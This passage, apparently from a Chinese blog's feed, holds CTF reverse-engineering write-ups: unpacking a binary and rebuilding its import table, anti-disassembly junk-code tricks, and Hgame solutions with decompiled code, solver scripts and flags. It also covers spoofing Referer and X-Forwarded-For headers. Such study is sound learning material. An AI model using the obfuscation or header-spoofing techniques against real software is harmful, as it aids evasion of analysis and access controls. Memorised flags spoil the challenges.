装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。</p></blockquote><p>IAT当然可以自己动手改Dump出来的程序的16进制，但是我还是喜欢用ImportREC（明明有工具为什么还要自己动手……还容易写错）。</p><p><img src="https://s2.ax1x.com/2020/02/20/3ewXrT.png" srcset="/img/loading.gif" alt="crackme-5"></p><p>使用起来很简单，首先要把我们知道的OEP地址输入进去，注意这里是偏移地址，然后可以选择<code>IAT Autosearch</code>选项，但有的时候可能会不准确，这个时候可以手动寻找，RVA就是相对虚拟地址，Size就是大小，手动找的过程也很简单，只要找到调用的函数的部分，比如说<code>printf</code>，就可以在汇编代码里看到调用的地址，比如说<code>dword ptr [402094]</code>，这是个间接取址，这里取的是<code>402094</code>处指针指向的地址，这里才是真正的<code>printf</code>函数的入口，我们转到<code>402094</code>的位置，可以看到上下都有很多这样的指针，指向外部引用的函数，这里就是输入表</p><p><img src="https://s2.ax1x.com/2020/02/20/3erkMq.png" srcset="/img/loading.gif" alt="crackme-6"></p><p>两个不同的dll中间用0隔开，所以找到开始地址和结束地址，就能知道RVA和Size。</p><p>这个时候点<code>Get Imports</code>，中间窗口会显示出来，但是注意有时候会出现无效的值，这个时候可能需要手动修复或者是删除，如果全都显示有效，就可以<code>Fix Dump</code>，选择刚刚Dump出来的文件，成功的话会生成一个新的文件，这个文件是可以执行的程序，到这里脱壳的过程就结束了。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>回到题目本身，IDA打开</p><pre><code class="c++">signed int start(){  signed int result; // eax  int v1; // eax  char Buf; // [esp+4h] [ebp-38h]  char Dst; // [esp+5h] [ebp-37h]  Buf = 0;  memset(&amp;Dst, 0, 0x31u);  printf(&quot;Please Input Flag:&quot;);  gets_s(&amp;Buf, 0x2Cu);  if ( strlen(&amp;Buf) == 42 )  {    v1 = 0;    while ( (*(&amp;Buf + v1) ^ byte_402130[v1 % 16]) == dword_402150[v1] )    {      if ( ++v1 &gt;= 42 )      {        printf(&quot;right!\n&quot;);        goto LABEL_8;      }    }    printf(&quot;error!\n&quot;);LABEL_8:    result = 0;  }  else  {    printf(&quot;error!\n&quot;);    result = -1;  }  return result;}</code></pre><p>发现程序的判断非常简单，可见这题的主要目的是为了考脱壳，把需要的数据导出之后，直接简单逆向输出flag</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() {    int dword_402150[] = { 18, 4, 8, 20, 36, 92, 74, 61, 86, 10, 16, 103, 0, 65, 0, 1, 70, 90, 68, 66, 110, 12, 68, 114, 12, 13, 64, 62, 75, 95, 2, 1, 76, 94, 91, 23, 110, 12, 22, 104, 91, 18};    char aThisIsNotFlag[] =            &quot;this_is_not_flag&quot;;    string flag;    for(int i =0;i&lt;42;i++)    {        flag+=(dword_402150[i]^aThisIsNotFlag[i%16]);    }    cout&lt;&lt;flag&lt;&lt;endl;    return 0;}</code></pre><p>输出得到flag</p><pre><code>flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花指令</title>
    <link href="/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p><strong><em>年轻人的第一个花指令</em></strong></p><p>这里写一下有关花指令的内容，自己的理解也很有限，只能以后再多学学再补充，现在只能把自己知道的写下来。  </p><a id="more"></a><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>首先反汇编有一个很关键的问题，就是怎么样区分数据和代码，由于x86和x64架构的每条指令是不等长的，区分数据和代码就变得很困难，反汇编的算法必须要对汇编指令长度和各种各样的跳转进行适当的处理，不然就会发生错误，导致反汇编失败，这也是花指令的作用。  </p><p>目前主要的反汇编算法主要还是线性扫描<em>(Linear Sweep)*和较高级的递归行进</em>(Recursive Traversal)*，目前我比较常用的就是OD和IDA，它们的工作原理列在下面，此外还尝试了Ghidra，这个工具比较神奇，可以在有花指令的情况下抛掉很多无用的指令，反汇编出函数的大概，目前工作的原理还没有详细地了解，这里先提一下，了解之后再补充。</p><blockquote><p>线性扫描本身的技术含量不是很高，反汇编工具将整个模块中的每一条指令都反汇编成汇编指令，每一个遇到的机器码都会当作汇编指令处理（不加判断），所以线性扫描根本不能把代码和数据区分开来，而一旦一条指令开始出错，整个反汇编都开始出错。</p></blockquote><blockquote><p>递归行进算法相较于线性扫描算法更灵活一些，它是按照代码可能的执行顺序来反汇编程序，每条可能的路径来扫描，解码出分支之后会记录这个地址，分别反汇编各个分支中的指令，这样按照路径进行搜寻，可以有效避免将数据识别成指令的问题。  </p></blockquote><table><thead><tr><th>工具</th><th>算法</th></tr></thead><tbody><tr><td>OllyDbg</td><td>Linear Sweep/Recursive Traversal(Ctrl+A)</td></tr><tr><td>IDA Pro</td><td>Recursive Traversal</td></tr><tr><td>Ghidra</td><td></td></tr></tbody></table><p>但是我们可以通过巧妙地构造代码和数据，插入一些<em>“花指令”</em>，以此干扰反汇编软件。因为前面提到的不同的机器指令包含的字节数不同地原因，所有的多字节指令只有正确识别第一个字节，也就是操作码，才能正确实现反汇编，否则就会识别成完全不同的另一条指令。</p><p>而迷惑递归行进算法还需要多动动脑子，一两个简单的垃圾数据不会使递归行进算法失效，但是，个人理解，在递归行进算法中，任意的控制转移指令，其后的地址都认为是有效的，因为递归行进算法中最重要的就是通过跳转来确定分支，因此，我们可以利用跳转来实现我们想要的<em>“花指令”</em>。</p><h4 id="常见花指令"><a href="#常见花指令" class="headerlink" title="常见花指令"></a>常见花指令</h4><ul><li><p><code>jx &amp; jnx</code></p><p>比如说这样一段代码</p></li></ul><pre><code class="asm">text:00401065            jz short near ptr loc_40107Ctext:00401067            jnz short near ptr loc_40107Ctext:00401069text:00401069 loc_401069:text:00401069            db 36h  ;junk code heretext:0040107C            ……</code></pre><p>​    这里只是一个随便编写的例子，但是差不多所有的处理都是这个样子，两个互补指令代替了一个强制跳转，但是在IDA这里，没有成功跳转的分支也是默认有效的，所以会去解析<code>junk code</code>，后面的指令也就跟着出错了。</p><ul><li><p><code>call+pop/(add esp)+return</code></p><p>比如说这样的代码</p><pre><code class="asm">text:0040103B        call loc_401042text:0040103B sub_401022    endp;sp-analysis failedtext:0040103Btext:00401040        cmp cl,dltext:00401042text:00401042 loc_401042:text:00401042        add esp,4</code></pre><p><code>call</code>指令相当于<code>jmp</code>+<code>push eip</code>，所以用<code>add esp,4</code>指令可以消除入栈的<code>eip</code>的影响，此时<code>call</code>就相当于<code>jmp</code>，但是IDA还是会把<code>0x401042</code>当作新函数的首地址，所以当前函数的识别就会出错，IDA会找不到结束位置，因此没法继续反汇编。</p></li><li><p><code>jx</code></p><p>这一类理解起来也蛮简单的，就是<code>jmp</code>到一个IDA无法解析的位置，比如说下面这段</p><pre><code class="asm">.text:00000000004009F5 loc_4009F5:                             .text:00000000004009F5                 jmp     short near ptr loc_4009FB+1;---------------------------------------------------------------------------;从这里开始.text:00000000004009F7                 xor     eax, eax.text:00000000004009F9                 jz      short loc_4009F5.text:00000000004009FB.text:00000000004009FB loc_4009FB:                             .text:00000000004009FB                 call    near ptr 0C59748h</code></pre><p>最下面这个<code>0c59748</code>的地址显然是无效的，这里肯定是出了问题，仔细观察一下代码，<code>xor  eax, eax</code>这句得到的是0，所以下一个跳转是一定可以实现的，但是IDA判断不出来，他会对所有可能的分支进行解析，所以会从<code>0x4009FB</code>出开始解析新的命令，然后这个跳转并不存在，就会提示地址不存在，但是真正让反汇编进行不下去的是接下来的操作，另一条可能的路径，即正常的执行流程，进入到<code>0x4009F5</code>之后跳转到了<code>0x4009FC</code>的位置，但是这里已经解析过了，被一条假的命令占用了，IDA就会停止反汇编，然后报错。</p></li><li><p><code>call</code>+一些巧妙的处理</p><p>最近比赛的时候见到了一个很不错的花指令，可以学习一下，在<code>call</code>指令之后写入一些<code>junk code</code>，然后在调用的函数中对返回地址进行处理跳过<code>junk code</code>，详细的过程在<a href="http://blog.rycbar.club/2020/03/30/MRCTF-wp/#junk">这里</a></p></li></ul><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>写花指令的方式实在太多，也有很多很有创意的花指令，记录是记录不完的，但是只要掌握的原理，跟着程序的流程走，都不会有太大的难度，熟练了以后可以尝试使用脚本去除花指令。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>花指令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hgame_wp</title>
    <link href="/2020/01/25/hgame-wp/"/>
    <url>/2020/01/25/hgame-wp/</url>
    
    <content type="html"><![CDATA[<p>记录一下Hgame的部分题解和一些解题时的思路</p><a id="more"></a><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头：</p><pre><code class="http">Referer:https://vidar.club</code></pre><p>然后提示需要从本地访问，添加响应头：</p><pre><code class="http">X-Forwarded-For: 127.0.0.1</code></pre><p>接着提示flag会在2077年更新，所以添加响应头：</p><pre><code class="http">If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT</code></pre><p>再发送请求得到flag</p><pre><code class="flag">hgame{W0w!Your_heads_@re_s0_many!}</code></pre><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>一看题目又是一道迷宫题，拖进IDA反编译</p><pre><code class="c++">v5 = (char *)&amp;unk_6020C4;  while ( (signed int)v4 &lt; SHIDWORD(v4) )  {    v3 = s[(signed int)v4];    if ( v3 == 100 )    {      v5 += 4;    }    else if ( v3 &gt; 100 )    {      if ( v3 == 115 )      {        v5 += 64;      }      else      {        if ( v3 != 119 )        {LABEL_12:          puts(&quot;Illegal input!&quot;);          exit(0);        }        v5 -= 64;      }    }    else    {      if ( v3 != 97 )        goto LABEL_12;      v5 -= 4;    }    if ( v5 &lt; (char *)&amp;unk_602080 || v5 &gt; (char *)&amp;unk_60247C || *(_DWORD *)v5 &amp; 1 )      goto LABEL_22;    LODWORD(v4) = v4 + 1;  }  if ( v5 == (char *)&amp;unk_60243C )  {    sprintf(&amp;v7, &quot;hgame{%s}&quot;, s, v4);    puts(&quot;You win!&quot;);    printf(&quot;Flag is: &quot;);    puts(&amp;v7);    exit(0);  }LABEL_22:  puts(&quot;You died&quot;);  exit(0);</code></pre><p>贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点</p><p><img src="https://s2.ax1x.com/2020/02/13/1qp5rT.png" srcset="/img/loading.gif" alt="maze"></p><p>即从（2，2）位置走到（15，16）位置</p><p>所以最后的flag为</p><pre><code class="flag">hgame{ssssddddddsssssddwwdddssssdssdd}</code></pre><h4 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h4><p>这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。</p><p>首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析</p><pre><code class="c++">//只贴出了有用的部分并且稍做了排版void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){  char v6; // [rsp+10h] [rbp-60h]  char v7; // [rsp+11h] [rbp-5Fh]  char v8; // [rsp+12h] [rbp-5Eh]  char v9; // [rsp+13h] [rbp-5Dh]  char v10; // [rsp+14h] [rbp-5Ch]  char v11; // [rsp+15h] [rbp-5Bh]  char v12; // [rsp+16h] [rbp-5Ah]  char v13; // [rsp+17h] [rbp-59h]  __int64 v14; // [rsp+20h] [rbp-50h]  char v15; // [rsp+28h] [rbp-48h]  __int64 v16; // [rsp+30h] [rbp-40h]  char v17; // [rsp+38h] [rbp-38h]  char s; // [rsp+40h] [rbp-30h]        //地址是连续的，flag中间的具体内容是v24和v25起始的两个16  char v19; // [rsp+41h] [rbp-2Fh]        //字节  char v20; // [rsp+42h] [rbp-2Eh]  char v21; // [rsp+43h] [rbp-2Dh]  char v22; // [rsp+44h] [rbp-2Ch]  char v23; // [rsp+45h] [rbp-2Bh]  __int16 v24; // [rsp+46h] [rbp-2Ah]  __int16 v25; // [rsp+56h] [rbp-1Ah]  char v26; // [rsp+66h] [rbp-Ah]  sub_4007E6();//只负责输出，没什么功能  v6 = 76;v7 = 60;v8 = 214;v9 = 54;v10 = 80;v11 = 136;v12 = 32;v13 = 204;  __isoc99_scanf(&quot;%39s&quot;, &amp;s);  if ( strlen(&amp;s) == 39 &amp;&amp; s == &#39;h&#39; &amp;&amp; v19 == &#39;g&#39; &amp;&amp; v20 == &#39;a&#39; &amp;&amp; v21 == &#39;m&#39; &amp;&amp; v22 == &#39;e&#39; &amp;&amp; v23 == &#39;{&#39; &amp;&amp; v26 == &#39;}&#39; )// 共39位，hgame{***}格式  {    v14 = 0LL;    v15 = 0;    v16 = 0LL;    v17 = 0;    //这两条命令进行第一部分运算    sub_400616((__int64)&amp;v14, (__int64)&amp;v24);   // 传入地址，对flag中的部分进行操作    sub_400616((__int64)&amp;v16, (__int64)&amp;v25);    //这里开始进行第二部分运算    for ( i = 0; i &lt;= 7; ++i )    {      *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; 0xE0) &gt;&gt; 5) | 8 * *((_BYTE *)&amp;v14 + i);// &amp;v14 + i前三位与后五位交换位置      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或      *((_BYTE *)&amp;v16 + 7 - i) = 2 * (*((_BYTE *)&amp;v14 + i) &amp; 0x55) ^ *((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA | *((_BYTE *)&amp;v16 + 7 - i) &amp; 0x55;// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; 0x55 ^ ((*((_BYTE *)&amp;v16 + 7 - i) &amp; 0xAA) &gt;&gt; 1) | *((_BYTE *)&amp;v14 + i) &amp; 0xAA;// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或    }                                               //这里进行第三部分运算    for ( j = 0; j &lt;= 7; ++j )    {      *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j);       // v6 = 76;                                                //   v7 = 60;                                                //   v8 = 214;                                                //   v9 = 54;                                                //   v10 = 80;                                                //   v11 = 136;                                                //   v12 = 32;                                                //   v13 = 204;      if ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )// e4sy_Re_      {        puts(&quot;sry, wrong flag&quot;);        exit(0);      }    }    for ( k = 0; k &lt;= 7; ++k )    {      *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k);    // v6 = 76;                                //这里异或之后又变成了V14最初始的值         //   v7 = 60;                                                                    //   v8 = 214;                                                                    //   v9 = 54;                                                                    //   v10 = 80;                                                                    //   v11 = 136;                                                                    //   v12 = 32;                                                                    //   v13 = 204;      if ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )// Easylif3      {        puts(&quot;Just one last step&quot;);        exit(0);      }    }    puts(&quot;Congratulations! You are already familiar with bitwise operation.&quot;);    puts(&quot;Flag is your input.&quot;);    exit(0);  }  puts(&quot;Illegal input!&quot;);  exit(0);}//sub_400616() 第一部分运算所用到的函数_BYTE *__fastcall sub_400616(__int64 a1, __int64 a2){  _BYTE *result; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; i &lt;= 7; ++i )  {    if ( *(_BYTE *)(2 * i + a2) &lt;= 96 || *(_BYTE *)(2 * i + a2) &gt; 102 )    {      if ( *(_BYTE *)(2 * i + a2) &lt;= 47 || *(_BYTE *)(2 * i + a2) &gt; 57 )      {LABEL_17:        puts(&quot;Illegal input!&quot;);        exit(0);      }      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 48;    }    else    {      *(_BYTE *)(i + a1) = *(_BYTE *)(2 * i + a2) - 87;    }    if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 96 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 102 )    {      if ( *(_BYTE *)(2 * i + 1LL + a2) &lt;= 47 || *(_BYTE *)(2 * i + 1LL + a2) &gt; 57 )        goto LABEL_17;      result = (_BYTE *)(i + a1);      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 48;    }    else    {      result = (_BYTE *)(i + a1);      *result = 16 * *result + *(_BYTE *)(2 * i + 1LL + a2) - 87;    }  }  return result;}//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理</code></pre><p>把整个过程理解清楚之后可以开始写脚本进行一个逆运算了</p><pre><code class="python">#-*- coding:utf-8 -*-# 第三部分逆运算v = [76, 60, 214, 54, 80, 136, 32, 204]v0 = &#39;e4sy_Re_&#39;v14 = []for i in range(len(v0)):    v14.append(ord(v0[i]) ^ v[i])# print(v14)v16 = []v1 = &#39;Easylif3&#39;for i in range(len(v1)):    v16.append(ord(v1[i]) ^ v14[i])  # v14经过两次和v的异或又变回了原本的值# print(v16)# 第二部分逆运算for i in range(8):    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))    v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))    # print(bin(v16[7-i])[2:].rjust(8, &#39;0&#39;))    v16[7 - i] = (2 * (v14[i] &amp; 0x55) ^ v16[7 - i] &amp; 0xAA | v16[7 - i] &amp; 0x55) % 256    # print(bin(v16[7-i])[2:].rjust(8, &#39;0&#39;))    # print(bin(v14[i])[2:].rjust(8, &#39;0&#39;))    v14[i] = (((v14[i] &amp; 0x55) ^ ((v16[7 - i] &amp; 0xAA) &gt;&gt; 1) % 256) | v14[i] &amp; 0xAA) % 256    # print(bin(v14[i])[2:].rjust(8, &#39;0&#39;))    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))    v14[i] = (((v14[i] &amp; 0x1F) &lt;&lt; 5) | ((v14[i] &amp; 0xF8) &gt;&gt; 3)) % 256    # print(bin(v14[i])[2:].rjust(8,&#39;0&#39;))# print(v14)# print(v16)# 第一部分逆运算v24 = [0 for i in range(16)]v25 = [0 for i in range(16)]alphabet = [48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]# 字母表不多，逆运算难以进行所以采用遍历的方式进行计算for i in range(8):    for j in alphabet:        if 57 &gt;= j &gt; 47:            tmp = j - 48        else:            tmp = j - 87        v24[2*i]=j        if 57 &gt;= v14[i] - 16 * tmp + 48 &gt; 47:            v24[2 * i + 1] = v14[i] - 16 * tmp + 48            break        elif 102 &gt;= v14[i] - 16 * tmp + 87 &gt; 96:            v24[2 * i + 1] = v14[i] - 16 * tmp + 87            break        else:            continuefor i in range(8):    for j in alphabet:        v25[2 * i] = j        if 57 &gt;= j &gt; 47:            tmp = j - 48        else:            tmp = j - 87        if 102 &gt;= v16[i] - 16 * tmp + 87 &gt; 96:            v25[2 * i + 1] = v16[i] - 16 * tmp + 87            break        elif 57 &gt;= v16[i] - 16 * tmp + 48 &gt; 47:            v25[2 * i + 1] = v16[i] - 16 * tmp + 48            break        else:            continue# print(v24)# print(v25)flag = &#39;hgame{&#39;+&#39;&#39;.join([chr(v24[i]) for i in range(16)]) + &#39;&#39;.join([chr(v25[i]) for i in range(16)])+&#39;}&#39;print(flag)</code></pre><p>输出得到flag</p><pre><code class="flag">hgame{0f233e63637982d266cbf41ecb1b0102}</code></pre><p>到虚拟机上验证一下，发现结果正确</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpqi9.png" srcset="/img/loading.gif" alt="bitwise_operation2"></p><h4 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h4><p>windows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 len; // rax  int len0; // edi  unsigned __int64 v5; // rax  _BYTE *v6; // rbx  const char *v7; // rcx  char flag; // [rsp+20h] [rbp-118h]  puts(&quot;please input you flag:\n&quot;);  memset(&amp;flag, 0, 0x100ui64);  scanf(&quot;%s&quot;, &amp;flag, 100i64);  len = strlen(&amp;flag);                          // 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100）  len0 = len;  if ( !len )                                   // 若输入空字符串，直接报错  {LABEL_6:    v7 = &quot;try again\n&quot;;    goto LABEL_7;  }  v5 = sub_140002000(len);                        v6 = malloc(v5);                                // 分配空间  cryption(v6, (__int64)&amp;flag, len0);           // 加密算法部分  if ( strncmp(v6, &quot;0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX&quot;, 0x64ui64) )// 相同则返回0，跳过if，输出get it，flag正确  {    if ( v6 )      free(v6);    goto LABEL_6;  }  v7 = &quot;get it\n&quot;;LABEL_7:  puts(v7);  return 0;}//最重要的cryption加密函数signed __int64 __fastcall sub_140001EB0(_BYTE *a1, __int64 a2, int a3){  int v3; // er10  __int64 v4; // rax  __int64 v5; // rbx  _BYTE *v6; // rdi  _BYTE *v7; // r9  signed __int64 v8; // r11  unsigned __int64 v9; // rdx  unsigned __int64 v10; // rax  char v11; // cl  // a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度  v3 = 0;  v4 = a3 - 2;  v5 = a2;  v6 = a1;  v7 = a1;  if ( v4 &gt; 0 )  {    v8 = a2 + 1;    v9 = ((unsigned __int64)((unsigned __int64)(v4 - 1) * (unsigned __int128)0xAAAAAAAAAAAAAAABui64 &gt;&gt; 64) &gt;&gt; 1) + 1;    v3 = 3 * v9;    do    {      v10 = *(unsigned __int8 *)(v8 - 1);      v8 += 3i64;      *v7 = alphabet[v10 &gt;&gt; 2];      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v8 - 3) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v8 - 4) &amp; 3)];      v7[2] = alphabet[4i64 * (*(_BYTE *)(v8 - 3) &amp; 0xF) | ((unsigned __int64)*(unsigned __int8 *)(v8 - 2) &gt;&gt; 6)];      v7[3] = alphabet[*(_BYTE *)(v8 - 2) &amp; 0x3F];      v7 += 4;      --v9;    }    while ( v9 );  }  if ( v3 &lt; a3 )  {    *v7 = alphabet[(unsigned __int64)*(unsigned __int8 *)(v3 + v5) &gt;&gt; 2];    if ( v3 == a3 - 1 )    {      v11 = 61;      v7[1] = alphabet[16 * (*(_BYTE *)(v3 + v5) &amp; 3)];    }    else    {      v7[1] = alphabet[((unsigned __int64)*(unsigned __int8 *)(v5 + v3 + 1) &gt;&gt; 4) | 16i64 * (*(_BYTE *)(v3 + v5) &amp; 3)];      v11 = alphabet[4 * (*(_BYTE *)(v5 + v3 + 1) &amp; 0xF)];    }    v7[2] = v11;    v7[3] = 61;    v7 += 4;  }  *v7 = 0;  return v7 - v6 + 1;}</code></pre><p>可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组</p><pre><code class="python">alphabet=&#39;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</code></pre><p>观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。</p><pre><code class="python">#-*- coding:utf-8 -*-def b64de(path_in, path_out):    b64_str = open(path_in).read()    charset = &quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    # print(charset)    bin_str = []    for i in b64_str:        if i != &#39;=&#39;:            try:                x = str(bin(charset.index(i))).replace(&#39;0b&#39;, &#39;&#39;)            except ValueError:                print(i)            bin_str.append(&#39;{:0&gt;6}&#39;.format(x))  # 填充成6位            # print(bin_str)    b64_bin = bytearray()  # 最后只能写入bytes    nums = len(bin_str) // 4    remain = len(bin_str) % 4    fore_part = bin_str[:4 * nums]  # 四个一组截取    # print(fore_part)    while fore_part:        # 取4个6位base64字符，作为3个字节        b64_tmp = &#39;&#39;.join(fore_part[:4])  # 4*6/8        b64_tmp = [int(b64_tmp[x: x + 8], 2) for x in [0, 8, 16]]  # 转换成10进制        # print(b64_tmp)        for i in b64_tmp:            b64_bin.append(i)        fore_part = fore_part[4:]  # 向后移动四位    if remain:        remain_part = &#39;&#39;.join(bin_str[nums * 4:])        # print(remain_part)        tmp = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]        # print(tmp)        for i in tmp:            b64_bin.append(i)    # print(b64_bin)    fd = open(path_out, &#39;wb&#39;)    fd.write(b64_bin)    fd.close()if __name__ == &#39;__main__&#39;:    b64de(&quot;./pic_en.txt&quot;, &quot;./pic_de.txt&quot;)</code></pre><p>输出的flag为：</p><pre><code class="flag">hgame{b45e6a_i5_50_eazy_6VVSQ}</code></pre><h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><p>这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜</p><pre><code class="c++"> sub_140002AE0((__int64)&amp;v13);                 // 大概是string类的构造函数  sub_1400018D0(std::cin, &amp;v13);                // cin&gt;&gt;v13  v15 = &quot;hgame{&quot;;  sub_140002B30((__int64)&amp;v14);  if ( find_sub(&amp;v13, v15, 0i64) || find_sub(&amp;v13, &quot;}&quot;, 0i64) != 61 )// 猜测输入字符串长度位62，格式位hgame{***}  {    v5 = sub_140001900(std::cout, &quot;error&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, sub_140002830);    sub_140003010(&amp;v14);    sub_140002FA0(&amp;v13);    result = 0i64;  }  else  {    for ( i = 6i64; ; i = v11 + 1 )             // 一波操作完全看不懂，猜测是根据&#39;_&#39;来分割字符串，分割成9个数    {      LOBYTE(v0) = &#39;_&#39;;      v11 = find(&amp;v13, v0, i);      if ( v11 == -1 )        break;      v16 = sub_1400043B0(&amp;v13, &amp;v40, i, v11 - i);      v17 = v16;      v1 = sub_140003E80(v16);      v18 = atoll(v1);      sub_140004350(&amp;v14, &amp;v18);      sub_140002FA0(&amp;v40);    }    v19 = sub_1400043B0(&amp;v13, &amp;v41, i, 61 - i);    v20 = v19;    v2 = sub_140003E80(v19);    v21 = atoll(v2);                            // 直接把字符串转换成长整型，说明字符串里就是以&#39;_&#39;连接的数字    sub_140004350(&amp;v14, &amp;v21);    sub_140002FA0(&amp;v41);    v31 = 26727i64;                             // 根据下面的运算这里应该是两个矩阵    v32 = 24941i64;    v33 = 101i64;    v34 = 29285i64;    v35 = 26995i64;    v36 = 29551i64;    v37 = 29551i64;    v38 = 25953i64;    v39 = 29561i64;    v22 = 1i64;    v23 = 0i64;    v24 = 1i64;    v25 = 0i64;    v26 = 1i64;    v27 = 1i64;    v28 = 1i64;    v29 = 2i64;    v30 = 2i64;    for ( j = 0i64; j &lt; 3; ++j )                // 三个for循环时矩阵运算，如果满足条件就直接输出正确    {      for ( k = 0i64; k &lt; 3; ++k )      {        v12 = 0i64;        for ( l = 0; l &lt; 3; ++l )          v12 += *(&amp;v22 + 3 * l + k) * *(_QWORD *)sub_1400031E0(&amp;v14, l + 3 * j);        if ( *(&amp;v31 + 3 * j + k) != v12 )        {          v3 = sub_140001900(std::cout, &quot;error&quot;);          std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, sub_140002830);          sub_140003010(&amp;v14);          sub_140002FA0(&amp;v13);          return 0i64;        }      }    }    v6 = sub_140001900(std::cout, &quot;you are good at re&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v6, sub_140002830);</code></pre><p>最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag</p><p>尝试一下</p><pre><code class="python">import numpy as npa = np.array([[1, 0, 1], [0, 1, 1], [1, 2, 2]])b = np.linalg.inv(a)# print(b)# 